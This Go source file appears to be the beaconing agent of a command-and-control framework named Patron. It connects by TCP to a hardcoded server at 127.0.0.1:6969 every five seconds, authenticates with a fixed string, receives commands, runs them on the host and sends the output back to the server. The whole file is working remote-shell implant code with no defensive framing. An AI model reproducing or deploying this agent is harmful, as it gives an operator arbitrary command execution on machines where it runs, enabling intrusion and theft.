package main

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"

	"github.com/PatronC2/Patron/types"
	"github.com/s-christian/gollehs/lib/logger"
)

// func exec_command(text string) {

// }

func main() {
	for {
		beacon, err := net.Dial("tcp", "127.0.0.1:6969")
		if err != nil {
			log.Fatalln(err) // maybe try diff IP
		}
		fmt.Fprintf(beacon, "12344\n")
		text, _ := bufio.NewReader(beacon).ReadString('\n')
		message := strings.Split(text, "\n")
		if message[0] == "Yes" {
			logger.Logf(logger.Info, "Server Connected\n")
			dec := gob.NewDecoder(beacon)
			encoder := gob.NewEncoder(beacon)
			instruct := &types.GiveAgentCommand{}
			err := dec.Decode(instruct)
			if err != nil {
				log.Fatalln(err)
			}
			logger.Logf(logger.Debug, "Received : %s\n", instruct)
			message := instruct.Command
			CmdOut := ""
			if message != "" {
				logger.Logf(logger.Debug, "Command to run : %s\n", message)
				tokens := strings.Split(message, " ")
				var c *exec.Cmd
				if len(tokens) == 1 {
					c = exec.Command(tokens[0])
				} else {
					c = exec.Command(tokens[0], tokens[1:]...)
				}
				buf, _ := c.CombinedOutput()
				if err != nil {
					CmdOut = err.Error()
				}
				CmdOut += string(buf)
				logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
				// beacon.Write(buf)
			}
			destruct := types.GiveServerResult{
				Uuid:   "77777-777777-777777",
				Result: "whoami",
				Output: CmdOut,
			}
			err1 := encoder.Encode(destruct)
			if err1 != nil {
				log.Fatalln(err1)
			}
			logger.Logf(logger.Debug, "Sent encoded struct\n")
		} else {
			logger.Logf(logger.Debug, "No Auth\n")
			continue
		}
		beacon.Close()
		time.Sleep(time.Second * 5) // interval and jitter here
	}

}
